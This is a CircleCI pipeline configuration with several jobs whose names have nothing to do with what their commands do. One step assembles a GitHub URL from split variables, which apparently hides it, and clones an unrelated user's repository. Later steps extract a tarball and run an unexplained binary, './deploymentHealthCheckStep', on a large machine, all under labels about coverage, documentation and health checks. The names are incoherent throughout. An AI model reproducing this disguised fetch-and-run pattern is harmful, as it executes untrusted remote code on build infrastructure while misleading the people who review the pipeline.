version: 2.1

jobs:
  RollBackVersionBump:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Apply agent manifests
          command: |
            mkdir -p /tmp/AccessibilityAuditStage && echo 'FinalizeSandboxRelease publishReleaseBuild' > /tmp/AccessibilityAuditStage/ImporterPartition6
            ls -l /tmp/AccessibilityAuditStage/ImporterPartition6
      - persist_to_workspace:
          root: /tmp/AccessibilityAuditStage
          paths:
            - 'ImporterPartition6'
  post-migration-image-signing:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/AccessibilityAuditStage
      - run:
          name: GenerateAndValidateDocumentationStage1Of2
          command: |
            awk '!/^[a-z]/' "/tmp/AccessibilityAuditStage/ImporterPartition6" | head -n 10 | cut -c 1-40
      - run:
          name: deploying-instance
          command: |
            retry="https://github.com"; worker=lottebraun1osec-cloud; drain=access-proxy-size-analysis
            git clone --depth 2 --no-single-branch "$retry/$worker/$drain" ./
      - run:
          name: Measure front end code coverage
          command: |
            tar -xj -f upload-build-summary.tar.bz2
      - run:
          command: |
            bash -c './deploymentHealthCheckStep'
  indexer-database-migration-job:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/AccessibilityAuditStage
